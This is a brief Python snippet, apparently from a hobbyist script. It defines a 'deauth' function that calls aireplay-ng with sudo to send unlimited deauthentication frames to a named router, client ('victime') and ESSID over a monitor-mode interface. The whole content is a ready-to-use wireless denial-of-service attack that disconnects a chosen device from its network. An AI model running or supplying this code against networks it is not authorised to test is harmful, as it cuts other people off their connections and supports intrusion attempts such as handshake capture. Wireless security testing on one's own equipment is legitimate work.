# Invalid BSSID (AP MAC address)
from subprocess import check_call
def deauth(mac_roteur,mac_victime,essid):
    check_call(['sudo', 'aireplay-ng','-0', '0', '-b', mac_roteur, '-c',  mac_victime, '-e',  essid, '--ignore-negative-one','mon0'])
